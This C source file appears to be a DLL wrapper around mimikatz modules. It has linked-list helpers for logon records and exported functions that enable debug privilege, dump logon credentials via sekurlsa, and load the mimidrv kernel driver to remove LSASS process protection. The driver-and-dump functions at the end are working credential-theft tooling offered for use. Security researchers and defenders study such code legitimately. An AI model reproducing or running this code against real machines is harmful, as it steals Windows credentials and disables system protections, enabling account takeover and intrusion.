//Seklarity.com 
#include "SKA.h"
extern const KUHL_M * sekcee_modules;
struct LogonStruct *head_logon = NULL;
struct LogonStruct *curr_logon = NULL;
struct LogonStruct *ptr_logon = NULL;

//-start  linkedlist func
struct LogonStruct* create_logon_list(int val)
{
	struct LogonStruct *ptr_logon = (struct LogonStruct*)malloc(sizeof(struct LogonStruct));
	if (NULL == ptr_logon)
	{
		printf("\n Node creation failed in create_logon_list\n");
		return NULL;
	}
	ptr_logon->val = val;
	ptr_logon->authid = L"heaad id";
	ptr_logon->session = L"heaad id";
	ptr_logon->username = L"heaad dessc";
	ptr_logon->domain = L"domain";
	ptr_logon->logonserv = L"serv";
	ptr_logon->logondate = L"Ldate";
	//ptr_logon->logontime = L"Ltime";
	ptr_logon->sid = L"sid";
	ptr_logon->tp = 75;
	ptr_logon->next = NULL;

	head_logon = curr_logon = ptr_logon;
	return ptr_logon;
}

struct LogonStruct* add_to_logon_list(int val, BOOL add_to_end)
{
	if (NULL == head_logon)
	{
		return (create_logon_list(val));
	}

	struct LogonStruct *ptr_logon = (struct LogonStruct*)malloc(sizeof(struct LogonStruct));
	if (NULL == ptr_logon)
	{
		printf("\n Node creation failed in add_to_logon_list \n");
		return NULL;
	}
	ptr_logon->val = val;
	ptr_logon->authid = L"id";
	ptr_logon->session = L"sess";
	ptr_logon->username = L"dessc";
	ptr_logon->domain = L"domain";
	ptr_logon->logonserv = L"serv";
	ptr_logon->logondate = L"Ldate";
	//ptr_logon->logontime = L"Ltime";
	ptr_logon->sid = L"sid";
	ptr_logon->tp = 75;
	ptr_logon->next = NULL;
	
	if (add_to_end)
	{
		curr_logon->next = ptr_logon;
		curr_logon = ptr_logon;
	}
	else
	{
		ptr_logon->next = head_logon;
		head_logon = ptr_logon;
	}
	return ptr_logon;
}

struct LogonStruct* search_in_logon_list(int val, struct LogonStruct **prev)
{
	struct LogonStruct *ptr = head_logon;
	struct LogonStruct *tmp = NULL;
	BOOL found = FALSE;

	while (ptr != NULL)
	{
		if (ptr->val == val)
		{
			found = TRUE;
			break;
		}
		else
		{
			tmp = ptr;
			ptr = ptr->next;
		}
	}

	if (TRUE == found)
	{
		if (prev)
			*prev = tmp;
		return ptr;
	}
	else
	{
		return NULL;
	}
}

int delete_from_logon_list(int val)
{
	struct LogonStruct *prev = NULL;
	struct LogonStruct *del = NULL;

	del = search_in_logon_list(val, &prev);
	if (del == NULL)
	{
		return -1;
	}
	else
	{
		if (prev != NULL)
			prev->next = del->next;

		if (del == curr_logon)
		{
			curr_logon = prev;
		}
		else if (del == head_logon)
		{
			head_logon = del->next;
		}
	}

	free(del);
	del = NULL;

	return 0;
}

void print_logon_list(void)
{
	struct LogonStruct *ptr_logon = head_logon;

	printf("\n -------Printing list Start------- \n");
	while (ptr_logon != NULL)
	{
		printf("\n [%d] \n", ptr_logon->val);
		ptr_logon = ptr_logon->next;
	}
	printf("\n -------Printing list End------- \n");

	return;
}

//-end linkedlist func

__declspec(dllexport) LogonStruct* c_dllcall_for_logons(int* noofrecs)
{
	//creds
	int status = STATUS_SUCCESS;
	sekcee_initOrClean(TRUE);
	status = kuhl_m_privilege_debug_all();
	status = kuhl_m_sekurlsa_all();
	sekcee_initOrClean(FALSE);

	return head_logon;
}

__declspec(dllexport) void c_dllcall_for_addDriver()
{
	//add driver
	int status = STATUS_SUCCESS;
	wchar_t* remove_proc[2] = { L"/process:lsass.exe", L"/remove" };
	sekcee_initOrClean(TRUE);
	status = kuhl_m_kernel_add_mimidrv(0, NULL);
	status = kuhl_m_kernel_processProtect(2, remove_proc);
	sekcee_initOrClean(FALSE);
}

__declspec(dllexport) void c_dllcall_for_removeDriver()
{
	//remove driver
	int status = STATUS_SUCCESS;
	wchar_t* add_proc[1] = { L"/process:lsass.exe" };

	status = kuhl_m_kernel_processProtect(2, add_proc);
	kuhl_m_kernel_remove_mimidrv(0, NULL);
	
}
